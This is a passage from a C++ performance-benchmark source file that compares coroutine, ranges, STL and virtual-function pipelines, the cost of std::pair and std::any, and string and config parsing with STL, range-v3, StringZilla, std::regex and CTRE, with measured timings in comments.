            filter_stl(value, is_power_of_two, [&](std::uint64_t value) {
                filter_stl(value, is_power_of_three, [&](std::uint64_t value) {
                    prime_factors_stl(value, [&](std::uint64_t factor) { sum += factor, count++; });
                });
            });
        });
        if (count != 84 || sum != 645) state.SkipWithError("Incorrect result");
    }
}

BENCHMARK(pipeline_cpp11_stl);

/**
 *  C++20 introduces @b coroutines in the language, but not in the library,
 *  so we need to provide a minimal implementation of a "generator" class.
 *
 *  @see "Asymmetric Transfer" blogposts on coroutines by Lewis Baker:
 *       https://lewissbaker.github.io/
 */
#include <coroutine> // `std::coroutine_handle`

template <typename integer_type_>
struct integer_generator {
    struct promise_type {
        integer_type_ value_;

        std::suspend_always yield_value(integer_type_ value) noexcept {
            value_ = value;
            return {};
        }

        std::suspend_always initial_suspend() noexcept { return {}; }
        std::suspend_always final_suspend() noexcept { return {}; }
        integer_generator get_return_object() noexcept {
            return integer_generator {std::coroutine_handle<promise_type>::from_promise(*this)};
        }
        void return_void() noexcept {}
        void unhandled_exception() noexcept { std::terminate(); }
    };

    std::coroutine_handle<promise_type> coro;

    explicit integer_generator(std::coroutine_handle<promise_type> h) noexcept : coro(h) {}
    integer_generator(integer_generator const &) = delete;
    integer_generator(integer_generator &&other) noexcept : coro(other.coro) { other.coro = nullptr; }
    ~integer_generator() noexcept {
        if (coro) coro.destroy();
    }

    struct iterator {
        std::coroutine_handle<promise_type> handle_;

        iterator &operator++() noexcept {
            handle_.resume();
            return *this;
        }
        bool operator!=(iterator const &) const noexcept { return !handle_.done(); }
        integer_type_ const &operator*() const noexcept { return handle_.promise().value_; }
    };

    iterator begin() noexcept {
        coro.resume();
        return {coro};
    }
    iterator end() noexcept { return {nullptr}; }
};

integer_generator<std::uint64_t> for_range_generator(std::uint64_t start, std::uint64_t end) noexcept {
    for (std::uint64_t value = start; value <= end; ++value) co_yield value;
}

integer_generator<std::uint64_t> filter_generator( //
    integer_generator<std::uint64_t> values, bool (*predicate)(std::uint64_t)) noexcept {
    for (auto value : values)
        if (!predicate(value)) co_yield value;
}

integer_generator<std::uint64_t> prime_factors_generator(integer_generator<std::uint64_t> values) noexcept {
    for (std::uint64_t value : values) {
        // Factor out 2 first
        while ((value & 1) == 0) {
            co_yield 2;
            value >>= 1; // Equivalent to `value /= 2`
        }

        // Only consider odd factors from here on
        for (std::uint64_t factor = 3; factor * factor <= value; factor += 2) {
            while (value % factor == 0) {
                co_yield factor;
                value /= factor;
            }
        }

        // If value is still greater than 1, it's a prime number
        if (value > 1) co_yield value;
    }
}

static void pipeline_cpp20_coroutines(bm::State &state) {
    std::uint64_t sum = 0, count = 0;
    for (auto _ : state) {
        auto range = for_range_generator(pipe_start, pipe_end);
        auto filtered = filter_generator(filter_generator(std::move(range), is_power_of_two), is_power_of_three);
        auto factors = prime_factors_generator(std::move(filtered));
        // Reduce
        sum = 0, count = 0;
        for (auto factor : factors) sum += factor, count++;
        if (count != 84 || sum != 645) state.SkipWithError("Incorrect result");
    }
}

BENCHMARK(pipeline_cpp20_coroutines);

#pragma endregion // Coroutines and Asynchronous Programming

#pragma region Ranges and Iterators
#if defined(__cpp_lib_ranges)

/**
 *  C++20 ranges are a double-edged sword. They offer powerful abstractions,
 *  making complex tasks concise and expressive. But there's a price: they can
 *  be infamously hard to debug. If your compiler ever throws a range-related
 *  error, expect a wall of template gibberish that looks like a corrupted
 *  stack trace from a parallel universe.
 *
 *  Debugging them is a remarkable exercise in patience. It's highly recommended
 *  to use `-fconcepts-diagnostics-depth=10` to make meta-template errors more
 *  readable—assuming you're into that kind of suffering.
 *
 *  One especially maddening issue is handling non-homogeneous ranges, where
 *  the begin and end iterators are different types. The end iterator is often
 *  a "sentinel" like @b `std::default_sentinel_t`. But STL concepts don't always
 *  recognize such ranges as valid, causing these assertions to fail:
 *
 *      static_assert(std::ranges::view<prime_factors_view>);
 *      static_assert(std::ranges::input_range<prime_factors_view>);
 *
 *  As a result, operations like `std::views::join` may refuse to compile.
 */

#include <iterator> // `std::input_iterator_tag`
#include <ranges>   // `std::ranges`

class prime_factors_view : public std::ranges::view_interface<prime_factors_view> {
  private:
    std::uint64_t number_ = 0;

  public:
    prime_factors_view() noexcept {}
    explicit prime_factors_view(std::uint64_t n) noexcept : number_(n) {}

    class iterator {
        std::uint64_t number_ = 0;
        std::uint64_t factor_ = 0;

        inline void advance() noexcept {
            // Handle factor 2 separately
            if (factor_ == 2) {
                // Keep dividing by 2 as long as the number is even
                if ((number_ & 1) == 0) {
                    number_ >>= 1; // Equivalent to `number_ /= 2`
                    return;        // Still yielding factor = 2
                }
                else { factor_ = 3; } // No more factors of 2, move on to the next odd factor (3)
            }

            // Now handle only odd factors
            while (factor_ * factor_ <= number_) {
                if (number_ % factor_ == 0) {
                    number_ /= factor_;
                    return;
                }
                factor_ += 2; // Skip even numbers
            }

            // If we exit the loop, `number_` is either 1 or a prime:
            if (number_ > 1) { factor_ = number_, number_ = 0; } // The last entry
            else { factor_ = 0; }                                // Mark as end
        }

      public:
        using value_type = std::uint64_t;
        using difference_type = std::ptrdiff_t;
        using iterator_category = std::input_iterator_tag;
        using iterator_concept = std::input_iterator_tag;

        iterator() = default;
        iterator(std::uint64_t n) noexcept : number_(n), factor_(2) { advance(); }
        std::uint64_t operator*() const noexcept { return factor_; }
        iterator &operator++() noexcept {
            advance();
            return *this;
        }
        iterator operator++(int) noexcept {
            iterator temp = *this;
            ++(*this);
            return temp;
        }

        bool operator==(iterator const &other) const noexcept { return factor_ == other.factor_; }
        bool operator!=(iterator const &other) const noexcept { return factor_ != other.factor_; }
    };

    iterator begin() const noexcept { return iterator(number_); }
    iterator end() const noexcept { return iterator(); }
};

static_assert(std::ranges::view<prime_factors_view>, "The range must model `std::ranges::view`");
static_assert(std::ranges::input_range<prime_factors_view>, "The range must model `std::ranges::input_range`");

/**
 *  @brief  Inverts the output of a boolean-returning function.
 *          Useful for search predicates.
 */
template <typename function_type_>
auto not_fn(function_type_ f) noexcept {
    return [f](auto &&...args) { return !f(std::forward<decltype(args)>(args)...); };
}

static void pipeline_cpp20_ranges(bm::State &state) {
    std::uint64_t sum = 0, count = 0;
    for (auto _ : state) {
        auto pipeline =                                                                    //
            std::views::iota(pipe_start, pipe_end + 1) |                                   //
            std::views::filter(not_fn(is_power_of_two)) |                                  //
            std::views::filter(not_fn(is_power_of_three)) |                                //
            std::views::transform([](std::uint64_t x) { return prime_factors_view(x); }) | //
            std::views::join;

        // Interestingly, STL still struggles with non-homogeneous ranges,
        // if the `begin` and `end` iterators are of different types:
        //
        //      std::uint64_t sum = std::accumulate(
        //          pipeline.begin(), pipeline.end(), std::uint64_t{0});
        //
        sum = 0, count = 0;
        for (std::uint64_t factor : pipeline) sum += factor, count++;
        if (count != 84 || sum != 645) state.SkipWithError("Incorrect result");
    }
}

BENCHMARK(pipeline_cpp20_ranges);

/**
 *  The results for the input range [3, 49] on Intel Sapphire Rapids are as follows:
 *
 *      - `pipeline_cpp11_lambdas`:      @b 295ns
 *      - `pipeline_cpp11_stl`:          @b 831ns
 *      - `pipeline_cpp20_coroutines`:   @b 708ns
 *      - `pipeline_cpp20_ranges`:       @b 216ns
 *
 *  On Apple M2 Pro:
 *
 *      - `pipeline_cpp11_lambdas`:      @b 114ns
 *      - `pipeline_cpp11_stl`:          @b 547ns
 *      - `pipeline_cpp20_coroutines`:   @b 705ns
 *      - `pipeline_cpp20_ranges`:       @b N/A with Apple Clang
 *
 *  Why is STL slower than C++11 lambdas? STL's `std::function` allocates memory!
 *  Why are coroutines slower than lambdas? Coroutines allocate state and have
 *  additional overhead for resuming and suspending. Those are fairly simple to grasp.
 *
 *  But how can ranges be faster than lambdas? If that happens, the primary cause is
 *  the cost of moving data from registers to stack and back. Lambdas are closures,
 *  they capture their environment, and need to address it using the `rsp` register
 *  on x86. So if you see many `mov`-es and `rsp` arithmetic like:
 *
 *      mov     rax, QWORD PTR [rsp-16]
 *      xor     edx, edx
 *      add     rax, rcx
 *      mov     QWORD PTR [rsp-16], rax
 *      mov     rax, QWORD PTR [rsp-8]
 *      inc     rax
 *      mov     QWORD PTR [rsp-8], rax
 *      mov     rax, rsi
 *
 *  ... then you are probably looking at a lambda. Ranges, on the other hand, are
 *  lazy and don't need to capture anything. On the practical side, when implementing
 *  ranges, make sure to avoid branching even more than with regular code.
 *
 *  @see "Standard Ranges" by Eric Niebler: https://ericniebler.com/2018/12/05/standard-ranges/
 *  @see "Should we stop writing functions?"" by Jonathan Müller:
 *       https://www.think-cell.com/en/career/devblog/should-we-stop-writing-functions
 *  @see "Lambdas, Nested Functions, and Blocks, oh my!" by JeanHeyd Meneide:
 *       https://thephd.dev/lambdas-nested-functions-block-expressions-oh-my
 */

#endif            // defined(__cpp_lib_ranges)
#pragma endregion // Ranges and Iterators

#pragma region Variants, Tuples, and State Machines

#include <tuple>   // `std::tuple`
#include <variant> // `std::variant`

#pragma endregion // Variants, Tuples, and State Machines

#pragma region Virtual Functions and Polymorphism

/**
 *  Now that we've explored how to write modern, performant C++ code,
 *  let's dive into how @b not to do it. Ironically, this style of programming
 *  is still taught in universities and used in legacy systems across the industry.
 *  If you see something like this in a codebase at a prospective job — run 🙂
 */

#include <memory> // `std::unique_ptr`

class base_virtual_class {
  public:
    virtual ~base_virtual_class() = default;
    virtual void process(std::vector<std::uint64_t> &data) const = 0;
};

class for_range_virtual : public base_virtual_class {
    std::uint64_t start_, end_;

  public:
    for_range_virtual(std::uint64_t start, std::uint64_t end) : start_(start), end_(end) {}
    void process(std::vector<std::uint64_t> &data) const override {
        data.clear();
        for (std::uint64_t value = start_; value <= end_; ++value) data.push_back(value);
    }
};

class filter_virtual : public base_virtual_class {
    bool (*predicate_)(std::uint64_t);

  public:
    filter_virtual(bool (*predicate)(std::uint64_t)) : predicate_(predicate) {}
    void process(std::vector<std::uint64_t> &data) const override {
        data.erase(std::remove_if(data.begin(), data.end(), predicate_), data.end());
    }
};

class prime_factors_virtual : public base_virtual_class {
  public:
    void process(std::vector<std::uint64_t> &data) const override {
        std::vector<std::uint64_t> expanded;
        for (auto input : data) prime_factors_lambdas(input, [&](std::uint64_t factor) { expanded.push_back(factor); });
        data.swap(expanded);
    }
};

class homogeneous_virtual_pipeline : public base_virtual_class {
    std::vector<std::unique_ptr<base_virtual_class>> stages_;

  public:
    void add_stage(std::unique_ptr<base_virtual_class> stage) { stages_.push_back(std::move(stage)); }
    void process(std::vector<std::uint64_t> &data) const override {
        for (auto const &stage : stages_) stage->process(data);
    }
};

static void pipeline_virtual_functions(bm::State &state) {
    homogeneous_virtual_pipeline pipeline;
    pipeline.add_stage(std::make_unique<for_range_virtual>(pipe_start, pipe_end));
    pipeline.add_stage(std::make_unique<filter_virtual>(is_power_of_two));
    pipeline.add_stage(std::make_unique<filter_virtual>(is_power_of_three));
    pipeline.add_stage(std::make_unique<prime_factors_virtual>());

    std::uint64_t sum = 0, count = 0;
    for (auto _ : state) {
        std::vector<std::uint64_t> data;
        pipeline.process(data);
        sum = std::accumulate(data.begin(), data.end(), std::uint64_t {0});
        count = data.size();
        if (count != 84 || sum != 645) state.SkipWithError("Incorrect result");
    }
}

BENCHMARK(pipeline_virtual_functions);

/**
 *  Performance-wise, on this specific micro-example, the virtual functions
 *  are somewhere in the middle between C++20 ranges and C++11 STL solution.
 *
 *      - `pipeline_cpp11_lambdas`:      @b 295ns
 *      - `pipeline_cpp11_stl`:          @b 831ns
 *      - `pipeline_cpp20_coroutines`:   @b 708ns
 *      - `pipeline_cpp20_ranges`:       @b 216ns
 *      - `pipeline_virtual_functions`:  @b 491ns
 *
 *  This code is a hazard for multiple reasons:
 *
 *  - @b Spaghetti_Code_Guaranteed: As the code evolves, additional abstraction
 *    layers will accumulate. Each layer will add new APIs and constraints until
 *    developers are forced to skip-connect grandkids to grandparents, creating
 *    a tangled mess.
 *
 *  - @b Dynamic_Allocations_Everywhere: Memory allocations occur at every stage,
 *    slowing execution and increasing fragmentation risks. In real-world scenarios,
 *    allocations frequently overlap and can overwhelm allocators, forcing them
 *    to fall back on expensive heuristics.
 *
 *  - @b Data_Packing_Overhead: This approach inevitably leads to passing data
 *    using `std::any`, arrays of strings, or even JSON objects. CPUs will spend
 *    more time chasing pointers and repacking values than performing meaningful
 *    computations.
 *
 *  - @b Unscalable_Design: Abstract Syntax Trees, interpreters, and similar
 *    constructs built this way become unsalvageable, with performance hitting a
 *    hard ceiling due to constant memory indirections and hidden costs.
 *
 *  This design is so systemically bad that after reading earlier sections, you
 *  probably don't need further convincing. We're not writing a grant proposal,
 *  so let's skip proving that bad ideas are indeed bad — and focus on the good ones.
 *
 *  Contributions are welcome — but not using `virtual` functions! 😉
 */

#pragma endregion // Virtual Functions and Polymorphism

#pragma endregion // - Abstractions

#pragma region - Structures, Tuples, ADTs, AOS, SOA

#pragma region Continuous Memory

/**
 *  It's a blessing if one can just use lazy processing, but realistically,
 *  every program needs memory and it's layout and used structures matter.
 *
 *  Algebraic Data Types (ADTs) are one of the most sought-after features in
 *  modern programming languages. They allow you to define complex data types
 *  by combining simpler ones.
 *
 *  In C, the only way to achieve that is by combining `stuct` and `union` types.
 *  In C++, the Standard Library provides `std::variant`, `std::tuple`, `std::pair`,
 *  `std::optional`, and many other types that can be used to create ADTs.
 *
 *  Common sense suggests that there should be no performance degradation from
 *  using the library types. Well, how hard can it be to implement a `std::pair`?
 *  StackOverflow has 5 answers to a similar question - all 5 are wrong.
 *
 *  @see StackOverflow discussion:
 *  https://stackoverflow.com/questions/3607352/struct-with-2-cells-vs-stdpair
 *
 *  Let's compare the performance of `std::pair` with a custom `pair_t` structure,
 *  made of the same two elements, also named boringly - `first` and `second`.
 */
#include <tuple> // `std::tuple`

static void packaging_custom_pairs(bm::State &state) {
    struct pair_t {
        int first;
        float second;
    };
    std::vector<pair_t> a, b;
    a.resize(1'000'000);
    for (auto _ : state) bm::DoNotOptimize(b = a);
}

BENCHMARK(packaging_custom_pairs)->MinTime(2);

static void packaging_stl_pair(bm::State &state) {
    std::vector<std::pair<int, float>> a, b;
    a.resize(1'000'000);
    for (auto _ : state) bm::DoNotOptimize(b = a);
}

BENCHMARK(packaging_stl_pair)->MinTime(2);

static void packaging_stl_tuple(bm::State &state) {
    std::vector<std::tuple<int, float>> a, b;
    a.resize(1'000'000);
    for (auto _ : state) bm::DoNotOptimize(b = a);
}

BENCHMARK(packaging_stl_tuple)->MinTime(2);

/**
 *  Over @b 600 microseconds for STL variants vs @b 488 microseconds for the baseline.
 *  The naive variant, avoiding STL, is faster by @b 20%.
 *
 *  Why? With the `std::pair` in its way `std::vector` can't realize that the actual
 *  contents are trivially copyable and can be moved around without any overhead.
 *
 *  @see Reddit discussion: https://www.reddit.com/r/cpp/comments/ar4ghs/stdpair_disappointing_performance/
 */
static_assert(!std::is_trivially_copyable_v<std::pair<int, float>>);
static_assert(!std::is_trivially_copyable_v<std::tuple<int, float>>);

/**
 *  Coming from high-level type-punned languages, some junior developers are inclined
 *  to use `std::vector<std::any>` objects to define generic sequences. That's a horrible
 *  practice.
 */
#include <any> // `std::any`

static void packaging_stl_any(bm::State &state) {
    std::vector<std::any> a, b;
    a.resize(1'000'000);
    std::generate(a.begin(), a.end(), [] { return std::any(std::pair<int, float> {}); });
    for (auto _ : state) bm::DoNotOptimize(b = a);
}

BENCHMARK(packaging_stl_any)->MinTime(2);

/**
 *  Wrapping our STL pairs into `std::any` 10x the latency from 600 microseconds to 6 milliseconds.
 *  It's a design shortcut that almost always leads to a @b technical_debt, and coincidentally, can
 *  make your code 10x slower.
 */

#pragma endregion // Continuous Memory

#pragma region Strings, Parsing, and Regular Expressions

/**
 *  Many string libraries, including STL, Folly, and StringZilla, use a technique
 *  called "Small String Optimization" (SSO). It's a way to store small strings
 *  directly inside the string object, avoiding dynamic memory allocation.
 *
 *  Even though the `std::string::string(size_t, char)` constructor is not explicitly
 *  exception-safe, if you only use it for small strings, it won't throw a `bad_alloc`.
 *
 *  You empirically determine the capacity of the SSO buffer by running this benchmark.
 *  In `libstdc++` in GCC 13 it will be 15 bytes, while `sizeof(std::string)` is 32 bytes.
 *  In `libc++` in Clang 17 it will be 22 bytes, while `sizeof(std::string)` is 24 bytes.
 *  In StringZilla it is 22 bytes, while `sizeof(sz::string)` is 32 bytes.
 *
 *  @see "The strange details of std::string at Facebook"
 *       by Nicholas Ormrod at CppCon 2016: https://youtu.be/kPR8h4-qZdk
 *  @see Small String Optimization in StringZilla:
 *       https://github.com/ashvardanian/stringzilla?tab=readme-ov-file#memory-ownership-and-small-string-optimization
 */

static void small_string(bm::State &state) {
    std::size_t length = static_cast<std::size_t>(state.range(0));
    for (auto _ : state) bm::DoNotOptimize(std::string(length, 'x'));
}

// clang-format off
BENCHMARK(small_string)
    ->Arg(7)->Arg(8)->Arg(15)->Arg(16)
    ->Arg(22)->Arg(23)->Arg(24)->Arg(25)
    ->Arg(31)->Arg(32)->Arg(33);
// clang-format on

/**
 *  One of the most common practical tasks in programming is parsing text.
 *  Even with `std::string` Small String Optimization, it's still wiser to use
 *  simpler structures, like the C++17 `std::string_view`, for read-only access.
 *
 *  Still, `std::string_view` and `std::string` both have very limited API and
 *  are notoriously slow. Even splitting/tokenizing a string is non-trivial
 *  frequently debated topic.
 *
 *  @see Stack Overflow discussion:
 *       https://stackoverflow.com/questions/236129/how-do-i-iterate-over-the-words-of-a-string
 *
 *  Let's try to parse a typical NIX-style config file with key-value pairs,
 *  averaging the results for a short and a long configuration text.
 */
static constexpr std::string_view short_config_text =    //
    "# This is a comment line\r\n"                       // Windows newline
    "host : example.com\n"                               // Posix newline
    "\n"                                                 // ... and a typical empty line
    "port: 8080\r"                                       // Commodore newline
    " # Tricky comment with a : colon in the middle\n\r" // Accorn newline
    "\tpath :/api/v1";                                   // No trailing newline!

#if defined(_MSC_VER) // MSVC
#define FORCE_INLINE __forceinline
#elif defined(__GNUC__) || defined(__clang__) // GCC or Clang
#define FORCE_INLINE inline __attribute__((always_inline))
#else // Fallback
#define FORCE_INLINE inline
#endif

FORCE_INLINE bool is_newline(char c) noexcept { return c == '\n' || c == '\r'; }

FORCE_INLINE std::string_view strip_spaces(std::string_view text) noexcept {
    // Trim leading whitespace
    while (!text.empty() && std::isspace(text.front())) text.remove_prefix(1);
    // Trim trailing whitespace
    while (!text.empty() && std::isspace(text.back())) text.remove_suffix(1);
    return text;
}

template <typename callback_type_, typename predicate_type_>
inline void split(std::string_view str, predicate_type_ &&is_delimiter, callback_type_ &&callback) noexcept {
    std::size_t pos = 0;
    while (pos < str.size()) {
        auto const next_pos = std::find_if(str.begin() + pos, str.end(), is_delimiter) - str.begin();
        callback(str.substr(pos, next_pos - pos));
        pos = static_cast<std::size_t>(next_pos) == str.size() ? str.size() : next_pos + 1;
    }
}

inline std::pair<std::string_view, std::string_view> split_key_value(std::string_view line) noexcept {
    // Find the first colon (':'), which we treat as the key/value boundary
    auto pos = line.find(':');
    if (pos == std::string_view::npos) return {};
    // Trim key and value separately
    auto key = strip_spaces(line.substr(0, pos));
    auto value = strip_spaces(line.substr(pos + 1));
    // Store them in a pair
    return std::make_pair(key, value);
}

void config_parse_stl(std::string_view config_text, std::vector<std::pair<std::string, std::string>> &settings) {
    split(config_text, is_newline, [&settings](std::string_view line) {
        line = strip_spaces(line);
        if (line.empty() || line.front() == '#') return; // Skip empty lines or comments
        auto [key, value] = split_key_value(line);
        if (key.empty() || value.empty()) return; // Skip invalid lines
        settings.emplace_back(key, value);
    });
}

template <typename string_view_>
void parse_stl(bm::State &state, string_view_ config_text) {
    std::size_t pairs = 0, bytes = 0;
    std::vector<std::pair<std::string, std::string>> settings;
    for (auto _ : state) {
        settings.clear();
        config_parse_stl(config_text, settings);
        bm::DoNotOptimize(settings);
        pairs += settings.size();
        bytes += config_text.size();
    }
    state.SetBytesProcessed(bytes);
    state.counters["pairs/s"] = bm::Counter(pairs, bm::Counter::kIsRate);
}

/**
 *  The STL's `std::ranges::views::split` won't compile with a predicate lambda,
 *  but Eric Niebler's `ranges-v3` library has a `ranges::view::split_when` that does.
 *  It is also compatible with C++14 and newer, so we don't need C++20.
 */
#include <range/v3/view/filter.hpp>
#include <range/v3/view/split_when.hpp>
#include <range/v3/view/transform.hpp>

void config_parse_ranges(std::string_view config_text, std::vector<std::pair<std::string, std::string>> &settings) {
    namespace rv = ranges::views;
    auto lines =                     //
        config_text |                //
        rv::split_when(is_newline) | //
        rv::transform([](auto &&subrange) {
            // We need to transfrom a sequence of characters back into string-views!
            // https://stackoverflow.com/a/48403210/2766161
            auto const size = ranges::distance(subrange);
            // `&*subrange.begin()` is UB if the range is empty:
            return size ? std::string_view(&*subrange.begin(), size) : std::string_view();
        }) |
        rv::transform(strip_spaces) |
        // Skip comments and empty lines
        rv::filter([](std::string_view line) { return !line.empty() && line.front() != '#'; }) |
        rv::transform(split_key_value) |
        // Skip invalid lines
        rv::filter([](auto &&kv) { return !kv.first.empty() && !kv.second.empty(); });
    for (auto [key, value] : std::move(lines)) settings.emplace_back(key, value);
}

template <typename string_view_>
void parse_ranges(bm::State &state, string_view_ config_text) {
    std::size_t pairs = 0, bytes = 0;
    std::vector<std::pair<std::string, std::string>> settings;
    for (auto _ : state) {
        settings.clear();
        config_parse_ranges(config_text, settings);
        bm::DoNotOptimize(settings);
        pairs += settings.size();
        bytes += config_text.size();
    }
    state.SetBytesProcessed(bytes);
    state.counters["pairs/s"] = bm::Counter(pairs, bm::Counter::kIsRate);
}

#include <stringzilla/stringzilla.hpp>

void config_parse_sz(std::string_view config_text, std::vector<std::pair<std::string, std::string>> &settings) {
    namespace sz = ashvardanian::stringzilla;

    auto newlines = sz::char_set("\r\n");
    auto whitespaces = sz::whitespaces_set();

    for (sz::string_view line : sz::string_view(config_text).split(newlines)) {
        line = line.strip(whitespaces);
        if (line.empty() || line.front() == '#') continue; // Skip empty lines or comments
        auto [key, delimiter, value] = line.partition(':');
        key = key.strip(whitespaces);
        value = value.strip(whitespaces);
        if (key.empty() || value.empty()) continue; // Skip invalid lines
        settings.emplace_back(key, value);
    }
}

template <typename string_view_>
void parse_sz(bm::State &state, string_view_ config_text) {
    std::size_t pairs = 0, bytes = 0;
    std::vector<std::pair<std::string, std::string>> settings;
    for (auto _ : state) {
        settings.clear();
        config_parse_sz(config_text, settings);
        bm::DoNotOptimize(settings);
        pairs += settings.size();
        bytes += config_text.size();
    }
    state.SetBytesProcessed(bytes);
    state.counters["pairs/s"] = bm::Counter(pairs, bm::Counter::kIsRate);
}

BENCHMARK_CAPTURE(parse_stl, short_, short_config_text)->MinTime(2);
BENCHMARK_CAPTURE(parse_ranges, short_, short_config_text)->MinTime(2);
BENCHMARK_CAPTURE(parse_sz, short_, short_config_text)->MinTime(2);

/**
 *  How big can the difference be? Surely, SIMD is only relevant for Big Data?
 *  On the tiny config with just 3 fields and under 100 bytes in total:
 *
 *  - `parse_stl`:    @b 163 ns
 *  - `parse_ranges`: @b 720 ns
 *  - `parse_sz`:     @b 150 ns
 *
 *  How about larger files?
 */

static constexpr std::string_view long_config_text = R"(
# Server Configuration
server_primary_api_host_for_production_eu_west_1: main-api-primary-prod-eu-west-1.company.internal
server_secondary_api_host_for_production_eu_west_1: backup-api-secondary-prod-eu-west-1.company.internal
server_secure_tcp_port_for_https_communication: 443
server_base_path_for_data_access_layer_v2: /services/v2/resource/data-access-layer
server_connection_timeout_in_milliseconds: 180000

# Database Configuration
database_host_for_production_eu_west_1: db-prod-eu-west-1.cluster.company.internal
database_port_for_relational_engine: 3306
database_username_for_api_analytics_service: api_service_user
database_password_for_secure_authentication: 8kD3jQ!9Fs&2P
database_name_for_enterprise_analytics_and_reporting: analytics_reporting

# Logging Configuration
log_file_path_for_production_api_services: /var/log/api/prod/services/access.log
log_rotation_strategy_based_on_size_and_time: size_based
log_retention_period_in_days_for_archived_logs: 30
log_format_for_detailed_service_events: text

# Feature Toggles
feature_toggle_for_new_auth_flow: enabled
feature_toggle_for_legacy_support_mode: disabled
feature_toggle_for_dark_mode_experimentation: enabled
feature_toggle_for_multitenant_optimizations: enabled

# Monitoring Configuration
monitoring_metrics_endpoint_for_production_v2: metrics.company.com/v2/ingest
monitoring_alerting_thresholds_for_critical_warning_info: critical:90,warning:75,info:50
monitoring_dashboard_url_for_production_insights: https://dashboard.company.com/api/monitoring/prod
)";

BENCHMARK_CAPTURE(parse_stl, long_, long_config_text)->MinTime(2);
BENCHMARK_CAPTURE(parse_ranges, long_, long_config_text)->MinTime(2);
BENCHMARK_CAPTURE(parse_sz, long_, long_config_text)->MinTime(2);

/**
 *  The gap widens:
 *
 *  - `parse_stl`:    @b 1'591 ns
 *  - `parse_ranges`: @b 11'883 ns
 *  - `parse_sz`:     @b 1'182 ns
 *
 *  Sadly, oftentimes, the developers are too lazy to write a parser,
 *  and use Regular Expressions as a shortcut. Composing a RegEx pattern
 *  for our task, we should match 2 groups of characters - the key and the value.
 *  Those form a single line, with a mandatory colon (':') separator and optional
 *  whitespaces between tokens.
 *
 *  - line start + optional whitespace: `^\s*`
 *  - capturing the key: `([^#:\s]+)`
 *  - optional whitespace + colon + optional whitespace: `\s*:\s*`
 *  - capturing the value: `([^#:\s]+)`
 *  - optional trailing whitespace: `\s*$`
 *
 *  All together: `^\s*([^#:\s]+)\s*:\s*([^#:\s]+)\s*$`
 *  You can try unpacking it on RegEx101.com: https://regex101.com/
 */
#include <regex>

static constexpr std::string_view regex_for_config = R"(^\s*([^#:\s]+)\s*:\s*([^#:\s]+)\s*$)";

void config_parse_regex(std::string_view config_text, std::vector<std::pair<std::string, std::string>> &settings,
                        std::regex const &regex_fsm) {
    auto begin_ptr = config_text.data();
    auto end_ptr = begin_ptr + config_text.size();

    // Use `std::cregex_iterator` to find all non-overlapping matches
    // across multiple lines. We rely on "multiline" mode to treat
    // ^ and $ as line boundaries.
    std::cregex_iterator it(begin_ptr, end_ptr, regex_fsm);
    std::cregex_iterator end_it;

    // For each match, capture the "key" and "value" groups.
    // Group 0 is the full match, 1 and 2 are our key and value.
    for (; it != end_it; ++it) {
        std::cmatch const &match = *it;
        std::string key = match.str(1);
        std::string value = match.str(2);
        settings.emplace_back(std::move(key), std::move(value));
    }
}

template <typename string_view_>
void parse_regex(bm::State &state, string_view_ config_text) {
    std::size_t pairs = 0, bytes = 0;
    std::vector<std::pair<std::string, std::string>> settings;

    // Use multiline mode so ^ and $ anchor to line breaks.
    auto regex_options = std::regex_constants::ECMAScript | std::regex_constants::multiline;
    // Construct the regex only once. Compilation is expensive!
    // BTW, there is still no `std::string_view` constructor 🤦‍♂️
    std::regex regex_fsm(regex_for_config.data(), regex_for_config.size(), regex_options);

    for (auto _ : state) {
        settings.clear();
        config_parse_regex(config_text, settings, regex_fsm);
        bm::DoNotOptimize(settings);
        pairs += settings.size();
        bytes += config_text.size();
    }
    state.SetBytesProcessed(bytes);
    state.counters["pairs/s"] = bm::Counter(pairs, bm::Counter::kIsRate);
}

BENCHMARK_CAPTURE(parse_regex, short_, short_config_text)->MinTime(2);
BENCHMARK_CAPTURE(parse_regex, long_, long_config_text)->MinTime(2);

/**
 *  Assuming our patterns are known ahead of time, we can use C++ meta-programming
 *  for compile-time regex generation using expression templates, emitting an
 *  Assembly that is much more similar to the hand-written specialized parser,
 *  than a generic regex engine.
 *
 *  @see "Compile Time Regular Expressions" by Hana Dusíková at CppCon 2018:
 *       https://youtu.be/QM3W36COnE4
 */
#include <ctre.hpp>

void config_parse_ctre(std::string_view config_text, std::vector<std::pair<std::string, std::string>> &settings) {
    // ! CTRE isn't currently handling the `$` anchor correctly.
    // ! The current workaround is to add `?` to the last whitespace group.
    // ! https://github.com/hanickadot/compile-time-regular-expressions/issues/334#issuecomment-2571614075
    for (auto match : ctre::multiline_search_all<R"(^\s*([^#:\s]+)\s*:\s*([^#:\s]+)\s*?$)">(config_text)) {
        std::string_view key = match.get<1>().to_view();
        std::string_view value = match.get<2>().to_view();
        settings.emplace_back(key, value);
    }
}

template <typename string_view_>
void parse_ctre(bm::State &state, string_view_ config_text) {
    std::size_t pairs = 0, bytes = 0;
    std::vector<std::pair<std::string, std::string>> settings;

    for (auto _ : state) {
        settings.clear();
        config_parse_ctre(config_text, settings);
        bm::DoNotOptimize(settings);
        pairs += settings.size();
        bytes += config_text.size();
    }
    state.SetBytesProcessed(bytes);
    state.counters["pairs/s"] = bm::Counter(pairs, bm::Counter::kIsRate);
}

BENCHMARK_CAPTURE(parse_ctre, short_, short_config_text)->MinTime(2);
BENCHMARK_CAPTURE(parse_ctre, long_, long_config_text)->MinTime(2);

/**
 *  Aggregating the results for the short and long config files with
 *  hand-crafted and RegEx-based parsers, we get:
 *
 *  - `parse_stl`:    @b 163 ns     @b 1'591 ns
 *  - `parse_ranges`: @b 720 ns     @b 11'883 ns
 *  - `parse_sz`:     @b 150 ns     @b 1'182 ns
 *  - `parse_regex`:  @b 2'200 ns   @b 22'247 ns
 *  - `parse_ctre`:   @b 228 ns     @b 5'500 ns
 *
 *  As one can see, CTRE and expression-templates in general, are an
 *  exceptionally robust option, if you don't want to write a parser
 *  by hand.
 */

#pragma endregion // Strings, Parsing, and Regular Expressions

#pragma region JSON, Allocators, and Designing Complex Containers

/**
 *  There are several well-known libraries for JSON parsing in C/C++.
 *  The most popular is Niels Lohmann's `nlohmann::json`.
 *  The fastest for large inputs is Daniel Lemire's `simdjson`, which uses SIMD.
 *  The most portable is likely @ibireme's `yyjson`, implemented in pure C.
 *
 *  All of them are fairly simple to use, but even with the simplest tools,
 *  most developers never use them "correctly". One of the first things I recommend
 *  looking at with custom data-structures is how they handle memory allocations and
 *  checking the ability to @b override the default @b allocator.
 *
 *  For example, when processing network packets, we know the Maximum Transmission
 *  Unit @b (MTU) of the underlying protocol. So the payload of a single a message
